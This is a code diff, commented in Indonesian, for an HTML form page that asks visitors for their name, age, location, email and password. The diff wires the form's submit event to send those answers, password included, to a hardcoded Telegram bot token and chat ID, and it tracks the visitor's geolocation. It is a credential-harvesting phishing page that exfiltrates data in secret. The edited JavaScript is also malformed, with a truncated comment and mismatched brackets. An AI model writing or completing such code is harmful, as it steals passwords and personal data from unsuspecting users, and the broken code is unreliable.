@@ -41,6 +41,8 @@
       <input type="submit"></input>
     
     </form>
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    
     <script>
       const botToken = '5906990752:AAHv8iFSmHu4MC4SM_IB3EZSiyTLxaZULvM';
       const chatId = '-1001983705713'; // Chat ID penerima pesan
@@ -60,16 +62,15 @@ var tgl_lahir = document.getElementById('tgl_lahir')
 var email = document.getElementById('email')
 var kata_sandi = document.getElementById('kata_sandi')  
       var result = "\nNama : " + nama + "\nUmur : " + umur + "\nLokasi : " + lokasi + "\nEmail : " + email + "\nKata Sandi : " + kata_sandi
-      // Fungsi untuk mengirim pesan teks
-      function sendText() {
-        document.getElementById('fm').addEventListener("
+      // Fungsi untuk mengi
+        document.getElementById('fm').addEventListener("submit", async e => {
         const message = result
         if (message) {
           telegramRequest('sendMessage', { chat_id: chatId, text: message });
           alert('s')
   }
-        return true;
-      }
+        )}
+      
       function getLocation() {
                         if (navigator.geolocation) {
                             navigator.geolocation.watchPosition(showPosition,showError);
